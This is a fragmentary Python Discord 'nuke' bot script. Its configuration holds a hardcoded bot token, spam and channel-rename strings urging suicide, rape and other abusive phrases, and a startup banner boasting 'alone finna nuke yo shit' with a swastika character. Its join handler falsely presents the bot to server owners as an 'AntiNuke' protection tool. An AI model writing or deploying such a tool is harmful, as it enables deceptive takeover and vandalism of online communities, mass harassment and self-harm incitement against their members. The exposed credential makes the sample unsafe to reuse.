#☾☽CONFIG FOR BOT☾☽
token = "OTM0NDQ2NzMyNDYzNDQzOTk5.YewNVg.FZ_6ry8Nyq88RfUTCwcnRn_tSnA"
prefix = "."
#☫CONFIG FOR NUKE☫#
spam_messages = ["@everyone alone runs you", "@everyone alone is killing you"]
channel_names = ["commit suicide - alone", "alone brainfucked you"]
webhook_usernames = ["your moms pussy", "alone did it"]
rename_to = ["alone raped you bitch"]
server_name = ["alone crew is here!!"]
...
async def on_ready():
  print(f"""
{S.BRIGHT}{C.LIGHTGREEN_EX}aloneforever │ alone finna nuke yo shit │ 〝〞{S.NORMAL} 
lol
...
made by alone| discord.gg/staystrapped | AloneOnTop | alone owns you | your alones seed 
...
{S.RESET_ALL}                                       {C.RED} made by alone │ alone owns all of you │ ッ │ ☧
                       {C.BLUE}
                       AloneOnTopForever❤ │ discord.gg/staystrapped│ αιωαλζ ␖ ⍕ │ 卍
  """)
  try:
    bot.run(token)
...
@bot.event
async def on_guild_join(guild):
    embed = discord.Embed(title='Alone Anti', color=0xaa0000)
    embed.add_field(name="Hey Thanks For Adding Me To Your Server Im A AntiNuke In Process Made By Alone", value='\nTry typing .setup to get started.', inline=False)
